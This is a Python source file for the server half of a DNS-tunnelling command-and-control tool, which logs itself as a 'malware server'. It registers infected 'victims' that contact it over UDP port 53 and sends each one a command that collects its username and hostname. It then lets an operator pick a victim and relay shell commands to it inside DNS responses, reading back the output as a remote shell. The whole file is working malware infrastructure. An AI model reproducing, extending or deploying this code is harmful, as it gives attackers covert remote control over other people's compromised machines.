from objects.Victim import Victim
from objects.DNSQuery import DNSQuery
from socket import socket
from socket import AF_INET, SOCK_DGRAM
import logging


class QueriesManager:

    victims: dict[str, Victim]
    current_victim: Victim = None
    s: socket
    hacker_socket: socket = None
    max_paquet_size: int = 65527

    def __init__(self) -> None:
        self.victims = {}

    def start(
        self, listening_host: str = "localhost", listening_port: int = 53
    ) -> None:
        logging.basicConfig(level=logging.INFO)
        logging.info(
            f"Sarting malware server on {listening_host} {listening_port} (UDP)."
        )
        try:
            self.s = socket(AF_INET, SOCK_DGRAM)
            self.s.bind((listening_host, listening_port))
            while True:
                data, (host, port) = self.s.recvfrom(QueriesManager.max_paquet_size)
                dnsquery = DNSQuery(data)
                if dnsquery.isHelloQuery():
                    self.victims[host] = Victim(host, port)
                    self.s.sendto(
                        dnsquery.generateResponse("echo $USER && hostname".encode()),
                        (self.victims[host].ip_adress, self.victims[host].port),
                    )
                elif not self.victims[host].hostname or not self.victims[host].username:
                    data = dnsquery.extractPayload().strip().split("\n")
                    if len(data) == 2:
                        self.victims[host].username = data[0]
                        self.victims[host].hostname = data[1]
                    else:
                        self.victims[host].username = ""
                        self.victims[host].hostname = host
                elif self.current_victim and host == self.current_victim.ip_adress:
                    self.hacker_socket.send(dnsquery.extractPayload().encode())
                    self.printShell()
                self.victims[host].setCurrentQuery(dnsquery)
        except BrokenPipeError:
            self.s.close()
            raise ValueError("Server stop due to unexpected closed connection !")

    def close(self) -> None:
        self.s.close()

    def listVictims(self) -> str:
        return "\n".join(
            map(
                lambda vic: f"IP: {vic.ip_adress}, Port: {vic.port}, Username: {vic.username}, Hostname: {vic.hostname}",
                self.victims.values(),
            )
            + "\n"
        )

    def adminInterfaceConnection(self, ip: str, hacker_socket: socket) -> None:
        assert ip in self.victims.keys()
        self.current_victim = self.victims[ip]
        self.hacker_socket = hacker_socket
        self.hacker_socket.send(f"You are now connected to the victim:\n".encode())
        self.hacker_socket.send(
            f"IP: {self.current_victim.ip_adress}, Port: {self.current_victim.port}, Username: {self.current_victim.username}, Hostname: {self.current_victim.hostname}\n".encode()
        )
        self.hacker_socket.send(
            f"You can close the shell with the command:\n    closeshell\n".encode()
        )
        self.hacker_socket.send(
            f"You must use closeshell and not CTR+C (or CTRL+Z or CTRL+D). That will lead to a crash of the server due to unexpected closed connection.\n".encode()
        )
        self.printShell()

    def closeAdminInterfaceConnection(
        self,
    ) -> None:
        self.current_victim = None
        self.hacker_socket = None

    def respond(self, command: bytes) -> None:
        assert self.current_victim
        response = self.current_victim.generateResponse(command)
        self.s.sendto(
            response, (self.current_victim.ip_adress, self.current_victim.port)
        )

    def printShell(self) -> None:
        assert self.current_victim
        self.hacker_socket.send(
            (
                self.current_victim.username + "@" + self.current_victim.hostname + "> "
            ).encode()
        )
